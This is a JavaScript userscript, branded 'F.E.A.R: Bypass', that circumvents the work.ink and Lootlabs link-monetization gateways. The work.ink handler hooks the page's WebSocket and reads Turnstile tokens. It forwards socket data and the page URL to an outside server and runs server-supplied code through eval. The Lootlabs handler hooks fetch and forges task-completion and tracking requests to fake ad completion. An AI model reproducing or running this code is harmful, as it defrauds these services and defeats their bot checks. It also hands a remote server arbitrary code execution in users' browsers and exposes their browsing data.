class ClientSideBypass {
    static networkRequestCount = 0;

    static updateNetworkCounter() {
        const counter = document.getElementById('network-count');
        if (counter) {
            counter.textContent = this.networkRequestCount;
        }
    }

    static async handleWorkinkClientSide() {
        if (typeof unsafeWindow === 'undefined') return false;

        return new Promise((resolve) => {
            if (typeof WebSocket === 'undefined') {
                resolve(false);
                return;
            }

            const OriginalWebSocket = unsafeWindow.WebSocket;
            let wsCount = 0;
            let requestCount = 0;
            let overlayCreated = false;
            this.networkRequestCount = 0;
            this.updateNetworkCounter();

            function createFEAROverlay() {
                if (overlayCreated) return;
                overlayCreated = true;

                const e = document.createElement("style");
                e.textContent = "@import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@500;600&display=swap');";
                document.head.appendChild(e);

                const t = document.createElement("div");
                t.id = "fear-overlay";
                Object.assign(t.style, {
                    position: "fixed",
                    top: "0",
                    left: "0",
                    width: "100vw",
                    height: "100vh",
                    background: "#000000",
                    color: "#ffffff",
                    fontFamily: '"Roboto Mono", "Courier New", monospace',
                    display: "flex",
                    flexDirection: "column",
                    alignItems: "center",
                    justifyContent: "center",
                    zIndex: "999999",
                    textAlign: "center",
                    padding: "40px",
                    boxSizing: "border-box",
                    overflow: "hidden"
                });

                const o = document.createElement("h1");
                o.textContent = "F.E.A.R: Bypass";
                o.style.fontSize = "5em";
                o.style.margin = "0 0 10px 0";
                o.style.letterSpacing = "8px";
                o.style.color = "#0066cc";
                t.appendChild(o);

                const n = document.createElement("h2");
                n.textContent = "Bypassing work.ink client-side";
                n.style.fontSize = "1.4em";
                n.style.margin = "0 0 40px 0";
                n.style.opacity = "0.7";
                n.style.letterSpacing = "2px";
                t.appendChild(n);

                const r = document.createElement("p");
                r.innerHTML = 'This bypass takes time but avoids IP detection.<br><br>Just wait, it shouldn\'t take more than 2-3 minutes.';
                r.style.fontSize = "0.85em";
                r.style.lineHeight = "1.6";
                r.style.maxWidth = "800px";
                r.style.color = "#cccccc";
                r.style.margin = "15px 0";
                r.style.padding = "0 10px";
                r.style.fontFamily = "Arial, sans-serif";
                t.appendChild(r);

                const s = document.createElement("p");
                s.innerHTML = 'Server requests done: <span id="wkest-count">0/3 (approx)</span><br>Network requests: <span id="network-count">0</span>';
                s.style.fontSize = "1.2em";
                s.style.lineHeight = "1.8";
                s.style.maxWidth = "800px";
                s.style.color = "#cccccc";
                t.appendChild(s);

                const i = document.createElement("button");
                i.textContent = "Next";
                i.id = "fear-redirect-btn";
                Object.assign(i.style, {
                    marginTop: "50px",
                    padding: "16px 48px",
                    fontSize: "1.4em",
                    fontWeight: "600",
                    background: "#0066cc",
                    border: "none",
                    borderRadius: "8px",
                    color: "white",
                    cursor: "pointer",
                    transition: "background 0.3s ease",
                    display: "none"
                });
                i.onmouseover = () => i.style.background = "#0052a3";
                i.onmouseout = () => i.style.background = "#0066cc";
                i.onclick = () => {
                    if (unsafeWindow.wokeresponse) {
                        unsafeWindow.open(unsafeWindow.wokeresponse, "_blank");
                    }
                };
                t.appendChild(i);
                document.body.appendChild(t);
            }

            function updateWKestCount() {
                const e = document.getElementById("wkest-count");
                if (e) {
                    e.textContent = `${requestCount}/3 (approx)`;
                }
            }

            function showRedirectButton() {
                const e = document.getElementById("fear-redirect-btn");
                if (e) {
                    e.style.display = "block";
                }
            }

            async function getTurnstileToken() {
                let e = "";
                let t = 0;
                for (; !e && t < 150;) {
                    if (t++, "undefined" != typeof turnstile && "function" == typeof turnstile.getResponse) {
                        try {
                            if (e = turnstile.getResponse(), e && "string" == typeof e && e.length > 10) return e;
                        } catch (e) {
                            return "valid_by_error";
                        }
                    }
                    await new Promise(e => setTimeout(e, 200));
                }
                return "valid_by_error";
            }

            unsafeWindow.wokeresponse = null;

            unsafeWindow.WebSocket = function(url, protocols) {
                console.log("[ClientSideBypass]: WebSocket hooked");
                const urlStr = url.toString();
                let hostname = "";
                try {
                    hostname = new URL(urlStr).hostname;
                } catch (e) {
                    hostname = urlStr;
                }

                if (!hostname.includes("work.ink")) {
                    return new OriginalWebSocket(url, protocols);
                }

                const ws = new OriginalWebSocket(url, protocols);
                const id = ++wsCount;
                const originalSend = ws.send;

                ws.send = function(e) {
                    return originalSend.call(this, e);
                };

                ws.addEventListener("message", async (event) => {
                    let rawData = event.data;
                    if (typeof rawData === "string") {
                        try {
                            const token = await getTurnstileToken();
                            if (!overlayCreated) {
                                createFEAROverlay();
                                if ("valid_by_error" !== token) {
                                    await new Promise(e => setTimeout(e, 1000));
                                }
                            }

                            const encodedPayload = encodeURIComponent(rawData);
                            const userscriptVers = "ReBypass-v1.0";
                            const response = await unsafeWindow.fetch(`https://workink-bypass.site/api/clientSides/workink?payl=${encodedPayload}&pal=${encodeURIComponent(location.href)}&UVA=${encodeURIComponent(userscriptVers)}`, {
                                method: "GET",
                                headers: { Accept: "application/json" }
                            });

                            this.networkRequestCount++;
                            this.updateNetworkCounter();

                            if (!response.ok) return;

                            requestCount++;
                            updateWKestCount();

                            let payloadsToSend = [rawData];
                            if (response.ok) {
                                const e = await response.json();
                                if (e.pyl && Array.isArray(e.pyl) && e.pyl.length > 0) {
                                    const t = e.pyl;
                                    for (const e of t) {
                                        if ("string" == typeof e && e.startsWith("USC:setrep")) {
                                            const t = e.match(/USC:setrep[ao]?\((.+)\)/);
                                            if (t && t[1]) {
                                                unsafeWindow.wokeresponse = t[1].trim();
                                                showRedirectButton();
                                                ws.close();
                                            }
                                        }
                                    }
                                    payloadsToSend = t;
                                }
                            }

                            for (const item of payloadsToSend) {
                                if (typeof item === "string") {
                                    if (item.startsWith("USC:wait(")) {
                                        const e = item.match(/USC:wait\((\d+)\)/);
                                        if (e) {
                                            const t = parseInt(e[1], 10);
                                            await new Promise(e => setTimeout(e, 1000 * t));
                                            continue;
                                        }
                                    }
                                    if (item.startsWith("USC:eval(")) {
                                        const match = item.match(/USC:eval\((.+)\)/);
                                        if (match) {
                                            const encodedCode = match[1];
                                            try {
                                                const decodedCode = decodeURIComponent(encodedCode);
                                                console.log(decodedCode);
                                                eval(decodedCode);
                                            } catch (e) {
                                                console.error("Error in USC:eval:", e);
                                            }
                                            continue;
                                        }
                                    }
                                }
                                const toSend = typeof item === "string" ? item : JSON.stringify(item);
                                originalSend.call(ws, toSend);
                            }
                        } catch (e) {
                            console.error("[ClientSideBypass] Error:", e);
                            originalSend.call(ws, rawData);
                        }
                    }
                });

                return ws;
            };

            console.log("[ClientSideBypass]: Workink client-side bypass started");
            resolve(true);
        });
    }

    static async handleLootlabsClientSide() {
        if (typeof unsafeWindow === 'undefined') return false;

        return new Promise((resolve) => {
            let overlayCreated = false;
            let requestCount = 0;
            let zIndexInterval = null;
            this.networkRequestCount = 0;
            this.updateNetworkCounter();

            function createFEAROverlay() {
                if (overlayCreated) return;
                overlayCreated = true;

                const e = document.createElement("style");
                e.textContent = "@import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@500;600&display=swap');";
                document.head.appendChild(e);

                const t = document.createElement("div");
                t.id = "fear-overlay";
                Object.assign(t.style, {
                    position: "fixed",
                    top: "0",
                    left: "0",
                    width: "100vw",
                    height: "100vh",
                    background: "#000000",
                    color: "#ffffff",
                    fontFamily: '"Roboto Mono", "Courier New", monospace',
                    display: "flex",
                    flexDirection: "column",
                    alignItems: "center",
                    justifyContent: "center",
                    zIndex: "2147483647",
                    textAlign: "center",
                    padding: "40px",
                    boxSizing: "border-box",
                    overflow: "hidden",
                    pointerEvents: "none"
                });

                const n = document.createElement("h1");
                n.textContent = "F.E.A.R: Bypass";
                n.style.fontSize = "5em";
                n.style.margin = "0 0 10px 0";
                n.style.letterSpacing = "8px";
                n.style.color = "#0066cc";
                t.appendChild(n);

                const o = document.createElement("h2");
                o.textContent = "Bypassing loot-links client-side";
                o.style.fontSize = "1.4em";
                o.style.margin = "0 0 40px 0";
                o.style.opacity = "0.7";
                o.style.letterSpacing = "2px";
                t.appendChild(o);

                const s = document.createElement("p");
                s.innerHTML = 'Server requests done: <span id="wkest-count">0/6</span><br>Network requests: <span id="network-count">0</span>';
                s.style.fontSize = "1.2em";
                s.style.lineHeight = "1.8";
                s.style.maxWidth = "800px";
                s.style.color = "#cccccc";
                t.appendChild(s);

                const i = document.createElement("button");
                i.textContent = "Next";
                i.id = "fear-redirect-btn";
                Object.assign(i.style, {
                    marginTop: "50px",
                    padding: "16px 48px",
                    fontSize: "1.4em",
                    fontWeight: "600",
                    background: "#0066cc",
                    border: "none",
                    borderRadius: "8px",
                    color: "white",
                    cursor: "pointer",
                    transition: "background 0.3s ease",
                    display: "none",
                    pointerEvents: "auto"
                });
                i.onmouseover = () => i.style.background = "#0052a3";
                i.onmouseout = () => i.style.background = "#0066cc";
                i.onclick = () => {
                    if (unsafeWindow.wokeresponse) {
                        unsafeWindow.open(unsafeWindow.wokeresponse, "_blank");
                    }
                };
                t.appendChild(i);
                document.body.appendChild(t);
                zIndexInterval = setInterval(() => {
                    t.style.zIndex = "2147483647";
                }, 500);
            }

            function updateWKestCount() {
                const e = document.getElementById("wkest-count");
                if (e) {
                    e.textContent = `${requestCount}/6`;
                }
            }

            function showRedirectButton(e) {
                unsafeWindow.wokeresponse = e;
                const t = document.getElementById("fear-redirect-btn");
                if (t) {
                    t.style.display = "block";
                }
            }

            console.log("[ClientSideBypass]: Lootlabs client-side bypass started");

            const originalFetch = unsafeWindow.fetch;
            unsafeWindow.fetch = async function(...e) {
                const [t] = e;
                if ((typeof t === "string" ? t : t.url).includes("/tc")) {
                    try {
                        const t = await originalFetch(...e);
                        const n = await t.clone().json();
                        if (console.log("[ClientSideBypass]: Intercepted TC!"), setTimeout(() => {
                            createFEAROverlay();
                        }, 1500), Array.isArray(n) && n.length > 0) {
                            let { urid: e, task_id: t, action_pixel_url: o, session_id: s } = n[0];
                            1 === n.length ? (e = n[0].urid, t = n[0].task_id) : (e = n.map(e => e.urid).join(","), t = n.map(e => e.task_id).join(","));
                            const i = parseInt(e.slice(-5)) % 3;
                            console.log("[ClientSideBypass]: Starting WS...");
                            const c = "undefined" != typeof INCENTIVE_SERVER_DOMAIN ? INCENTIVE_SERVER_DOMAIN : "onsultingco.com";
                            const a = "undefined" != typeof INCENTIVE_SYNCER_DOMAIN ? INCENTIVE_SYNCER_DOMAIN : "nismscoldnesfspu.org";
                            const r = "undefined" != typeof KEY ? KEY : unsafeWindow.conf_rew.key;
                            const l = "undefined" != typeof TID ? TID : unsafeWindow.conf_rew.cd;
                            const d = location.href.includes("loot") ? "1" : "0";
                            const u = new WebSocket(`wss://${i}.${c}/c?uid=${e}&cat=${t}&key=${r}&session_id=${s}&is_loot=${d}&tid=${l}`);
                            u.onopen = () => {
                                setInterval(() => {
                                    u.send("PG0");
                                    console.log("[ClientSideBypass]: PG0");
                                    fetch("https://trw.lat/api/status?op=llbs").then(() => {
                                        this.networkRequestCount++;
                                        this.updateNetworkCounter();
                                    });
                                    requestCount++;
                                    updateWKestCount();
                                }, 10000);
                            };
                            u.onmessage = async e => {
                                if (console.log("[ClientSideBypass]: MEOB", e.data), e.data.startsWith("r:")) {
                                    const t = e.data.replace("r:", "").trim().replace(/[^ -~]/g, "");
                                    const n = await fetch(`https://trw.lat/api/clientSides/lootlabs?payl=${encodeURIComponent(t)}&pal=${encodeURIComponent(location.href)}`);
                                    this.networkRequestCount++;
                                    this.updateNetworkCounter();
                                    showRedirectButton((await n.json()).pyl);
                                    u.close();
                                }
                            };
                            navigator.sendBeacon(`https://${i}.${c}/st?uid=${e}&cat=${t}`);
                            fetch(o).then(() => {
                                this.networkRequestCount++;
                                this.updateNetworkCounter();
                            });
                            fetch(`https://${a}/td?ac=auto_complete&urid=${e}&cat=${t}&tid=${l}`).then(() => {
                                this.networkRequestCount++;
                                this.updateNetworkCounter();
                            });
                        }
                        return t;
                    } catch (t) {
                        return console.error("Bypass error:", t), originalFetch(...e);
                    }
                }
                return originalFetch(...e);
            };

            resolve(true);
        });
    }

    static isWorkinkDomain(domain) {
        const workinkDomains = ['work.ink', 'workink.net', 'workink.me', 'workink.one'];
        return workinkDomains.some(wd => domain.includes(wd));
    }

    static isLootlabsDomain(domain) {
        const lootlabsDomains = ['loot-link.com', 'loot-links.com', 'lootlinks.com', 'lootlinks.co', 'lootdest.com', 'lootdest.org', 'lootdest.info', 'loot-labs.com', 'lootlabs.com'];
        return lootlabsDomains.some(ld => domain.includes(ld));
    }
}

if (typeof module !== 'undefined' && module.exports) {
    module.exports = ClientSideBypass;
}